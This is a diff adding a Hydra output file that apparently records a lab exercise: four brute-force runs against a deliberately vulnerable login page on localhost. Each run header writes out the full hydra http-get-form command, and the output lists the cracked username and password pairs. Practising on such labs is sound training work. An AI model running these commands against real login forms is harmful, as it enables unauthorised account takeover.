@@ -1,0 +1,14 @@
+# Hydra v9.5 run at 2025-09-13 21:26:53 on 127.0.0.1 http-get-form (hydra -L users.txt -P passwords.txt -V -t 4 -o hydra_resultados.txt http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=524ac6a01e05b79384d94029f921309a; security=low:F=Username and/or password incorrect.)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: 1337   password: charley
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+# Hydra v9.5 run at 2025-09-13 21:34:10 on 127.0.0.1 http-get-form (hydra -L users.txt -P passwords.txt -V -t 4 -o hydra_resultados.txt http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=524ac6a01e05b79384d94029f921309a; security=low:F=Username and/or password incorrect.)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: 1337   password: charley
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+# Hydra v9.5 run at 2025-09-13 21:37:26 on 127.0.0.1 http-get-form (hydra -l admin -p password -V -t 4 -o hydra_resultados.txt http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=524ac6a01e05b79384d94029f921309a; security=low:F=Username and/or password incorrect.)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+# Hydra v9.5 run at 2025-09-13 21:37:46 on 127.0.0.1 http-get-form (hydra -l admin -p password -V -t 4 -o hydra_resultados.txt http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=524ac6a01e05b79384d94029f921309a; security=low:F=Username and/or password incorrect.)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
